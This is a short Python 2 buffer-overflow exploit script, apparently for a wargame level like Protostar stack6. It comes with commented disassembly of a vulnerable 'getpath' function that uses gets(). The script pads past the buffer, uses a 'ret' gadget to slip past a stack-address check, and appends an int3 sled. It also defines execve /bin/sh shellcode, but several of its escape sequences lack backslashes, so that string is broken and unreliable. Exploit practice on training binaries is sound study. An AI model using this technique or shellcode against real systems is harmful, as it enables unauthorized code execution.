import struct

pad = "0000AAAABBBBCCCCDDDDEEEEFFFFGGGGHHHHIIIIJJJJKKKKLLLLMMMMNNNNOOOOPPPPQQQQRRRRSSSS"
eip = struct.pack("I", 0xbffff7b0+32)
ret = struct.pack("I", 0x080484f9)
nops = "\xCC"*100
shellcode = "\x31\xc0\x50\x68\x2f\x2f\x73x68\x68\x2f\x62\x69\x6e\x89xe3\x89\xc1\x89\xc2\xb0\x0bxcd\x80\x31\xc0\x40\xcd\x80\xcc"

print pad + ret + eip + nops

# 0x08048484 <getpath+0>:	push   ebp
# 0x08048485 <getpath+1>:	mov    ebp,esp
# 0x08048487 <getpath+3>:	sub    esp,0x68 ; sub stack by 68=> 64 for buffer + 4 for uint ret
# 0x0804848a <getpath+6>:	mov    eax,0x80485d0
# 0x0804848f <getpath+11>:	mov    DWORD PTR [esp],eax
# 0x08048492 <getpath+14>:	call   0x80483c0 <printf@plt>
# 0x08048497 <getpath+19>:	mov    eax,ds:0x8049720
# 0x0804849c <getpath+24>:	mov    DWORD PTR [esp],eax
# 0x0804849f <getpath+27>:	call   0x80483b0 <fflush@plt>
# 0x080484a4 <getpath+32>:	lea    eax,[ebp-0x4c]
# 0x080484a7 <getpath+35>:	mov    DWORD PTR [esp],eax
# 0x080484aa <getpath+38>:	call   0x8048380 <gets@plt>
# ; here top of stack is 0xbffff7a8:	0x53535353	0x080484f9	0xbffff7e0	0xcccccccc
#                                       ^^^ padding     ^^^ ret below   ^^^ Stack       ^^^ Exploit
# 0x080484af <getpath+43>:	mov    eax,DWORD PTR [ebp+0x4] 
# 0x080484b2 <getpath+46>:	mov    DWORD PTR [ebp-0xc],eax
# 0x080484b5 <getpath+49>:	mov    eax,DWORD PTR [ebp-0xc]
# 0x080484b8 <getpath+52>:	and    eax,0xbf000000
# 0x080484bd <getpath+57>:	cmp    eax,0xbf000000
# 0x080484c2 <getpath+62>:	jne    0x80484e4 <getpath+96>
# 0x080484c4 <getpath+64>:	mov    eax,0x80485e4
# 0x080484c9 <getpath+69>:	mov    edx,DWORD PTR [ebp-0xc]
# 0x080484cc <getpath+72>:	mov    DWORD PTR [esp+0x4],edx
# 0x080484d0 <getpath+76>:	mov    DWORD PTR [esp],eax
# 0x080484d3 <getpath+79>:	call   0x80483c0 <printf@plt>
# 0x080484d8 <getpath+84>:	mov    DWORD PTR [esp],0x1
# 0x080484df <getpath+91>:	call   0x80483a0 <_exit@plt>
# 0x080484e4 <getpath+96>:	mov    eax,0x80485f0
# 0x080484e9 <getpath+101>:	lea    edx,[ebp-0x4c]
# 0x080484ec <getpath+104>:	mov    DWORD PTR [esp+0x4],edx 
# 0x080484f0 <getpath+108>:	mov    DWORD PTR [esp],eax
# 0x080484f3 <getpath+111>:	call   0x80483c0 <printf@plt>
# 0x080484f8 <getpath+116>:	leave  
# 0x080484f9 <getpath+117>:	ret 
